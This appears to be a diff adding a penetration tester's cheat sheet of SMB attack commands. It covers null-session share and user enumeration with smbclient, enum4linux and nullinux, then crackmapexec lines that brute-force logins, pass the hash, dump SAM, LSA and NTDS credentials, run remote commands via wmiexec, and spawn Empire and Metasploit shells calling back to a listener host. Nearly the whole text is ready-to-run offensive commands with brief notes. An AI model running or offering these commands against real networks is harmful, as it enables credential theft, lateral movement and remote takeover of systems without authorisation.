@@ -1,0 +1,90 @@
+	SMB/rtc/microsoft-ds
+smbclient -L 192.168.1.111 -U administrator -N
+	-make smb fileshare login request as -U parameter without attempting password to try enumerating sharenames, servers and workgroups
+nmap -sV -p 445 --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users 192.168.1.128
+	-run nmap smb enumeration scripts
+smbclient //192.168.1.111/sharename -U administrator -N
+	-try connecting samba session without known password
+smbclient -U guest -N -L 1.2.3.4
+smbmount "\\\\samba1\\customers" -U rtg2t -c 'mount /customers -u 500 -g 100'
+mount -t cifs
+mount.cifs //computername/sharefolder /mnt/share -o user=domain\\username,pass=password
+smb: \> commands
+	ls -list directory files
+	dir -list directory files
+	cd dirname -change directory
+	get filename -download file
+	put filename -upload file
+	
+
+nbtscan 192.168.1.0/24
+nmblookup -A 10.11.1.10
+	-status return <03> is currently logged-in user
+enum4linux -u guest -p "" -a 127.0.0.1
+python3 nullinux.py -shares -U 'Domain\User' -P 'Password1' 10.0.0.1,10.0.0.5
+python3 nullinux.py -users -quick DC1.Domain.net
+python3 nullinux.py -all -r 500-600 192.168.0.1
+smbget -R smb://127.0.0.1/dir
+smbpasswd
+smbmap
+smbcontrol
+smbcacls
+smbmount //198.168.1.1/share /mnt/here -o user=uname,password=pword
+mount -t cifs -o user=uname,password=pword //198.168.1.1/share /mnt/here
+
+cme smb 192.168.1.0/24
+	-map network hosts
+cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
+cat relaylistOutputFilename.txt
+	-generate relay list
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
+	-enumerate shares and access
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
+	-enumerate active sessions
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
+	-enumerate disks
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
+	-enumerate logged-on users
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
+	-enumerate domain users
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
+	-rid-cycle user enumeration
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
+	-enumerate domain groups
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-groups
+	-enumerate localhost groups
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
+	-return domain password policy
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
+cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
+	-dump credentials from hosts
+cme SMB 192.158.1.1 -u USER -p PASSWORD --spider C\$ --pattern txt
+	-spider shares for file
+crackmapexec smb 192.168.1.1 -u username -H LMHASH:NTHASH
+	-passing the hash
+crackmapexec smb <target(s)> -u '' -p ''
+	-null session enumeration
+python empire --rest --user empireadmin --pass Password123!
+crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
+	-use for empire shells
+crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.10.3 LPORT=8443
+	-use for metasploit shells
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
+cme smb 10.10.33.121 -u Administrator -p AAdmin\!23 -X '$PSVersionTable' --exec-method wmiexec
+	-return command execution (flag -x: cmd.exe; -X powershell); --exec-mothods wmiexec, smbexec, atexec; --force-ps32
+cme smb 10.10.33.121 -u Administrator -p 'P@ssw0rd' --wmi-namespace 'root\\cimv2' --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"
+	-wmi command exection
+
+nmap -p 445 --script smb-os-discovery 192.168.1.0/24
+nmap -sV -p 445 --script smb-brute 192.168.1.101
+
+smbd -b | grep WITH_PAM
+	-check if samba was configured with PAM(pluggable authentication modules)
+net
+	windows net.exe port for linux smbd
+net -S localhost -U% rpc rights list
+net -S localhost -U% rpc rights list accounts
